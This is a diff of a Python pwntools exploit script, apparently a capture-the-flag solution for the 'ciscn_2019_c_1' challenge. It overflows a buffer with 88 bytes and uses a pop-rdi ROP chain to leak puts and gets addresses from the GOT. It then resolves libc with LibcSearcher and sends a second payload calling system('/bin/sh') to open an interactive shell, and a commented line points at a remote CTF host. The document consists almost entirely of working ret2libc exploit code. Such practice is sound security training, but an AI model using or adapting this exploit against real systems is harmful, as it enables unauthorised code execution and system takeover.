@@ -5,36 +5,55 @@ from pwn import *
 def ciscn_2019_c_1(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_c_1'):
     context(log_level='debug', arch='amd64', os='linux')
     target = process([file_name])
+    # target = remote('node5.buuoj.cn', 27366)
     target_elf = ELF(file_name)
 
     puts_plt = p64(target_elf.plt['puts'])
-    gets_plt = p64(target_elf.plt['gets'])
     puts_got = p64(target_elf.got['puts'])
     gets_got = p64(target_elf.got['gets'])
 
+    encrypt_addr = p64(target_elf.symbols['encrypt'])
+
     pop_ret_gadget = p64(0x400c83)  # pop rdi ; ret
 
-    payload = b'A' * 88
+    payload_1 = b'A' * 88
     # puts(puts_got)
-    payload += pop_ret_gadget + puts_got + puts_plt
+    payload_1 += pop_ret_gadget + puts_got + puts_plt
     # puts(gets_got)
-    payload += pop_ret_gadget + gets_got + puts_plt
+    payload_1 += pop_ret_gadget + gets_got + puts_plt
+    # encrypt()
+    payload_1 += encrypt_addr
 
     target.sendlineafter(b'choice!', b'1')
-    target.sendlineafter(b'encrypted', payload)
+    target.sendlineafter(b'encrypted', payload_1)
 
     print(target.recv())
     print(target.recvline())
     print(target.recvuntil('\n'))
-    puts_addr = int.from_bytes(target.recv(6), byteorder='little', signed=True)
-    gets_addr = int.from_bytes(target.recv()[1:7], byteorder='little', signed=True)
+    puts_addr = u64(target.recv(6).ljust(8, b'\x00'))
+    gets_addr = u64(target.recv()[1:7].ljust(8, b'\x00'))
+    print('puts: %x' % puts_addr)
+    print('gets: %x' % gets_addr)
 
     searcher = LibcSearcher('puts', puts_addr)
     searcher.add_condition('gets', gets_addr)
 
-    libc_begin = puts_addr - searcher.dump('puts')
-    system_addr = libc_begin + searcher.dump('system')
-    bin_sh_addr = libc_begin + searcher.dump('')
+    libc_base_addr = puts_addr - searcher.dump('puts')
+    system_addr = p64(libc_base_addr + searcher.dump('system'))
+    bin_sh_addr = p64(libc_base_addr + searcher.dump('str_bin_sh'))
+    print('system: %x' % searcher.dump('system'))
+    print('str_bin_sh: %x' % searcher.dump('str_bin_sh'))
+
+    payload_2 = b'A' * 88
+    # system(/bin/sh)
+    payload_2 += pop_ret_gadget + bin_sh_addr + system_addr
+
+    # gdb.attach(target)
+
+    target.sendline(payload_2)
+
+    target.interactive()
+
 
 if __name__ == '__main__':
     ciscn_2019_c_1()
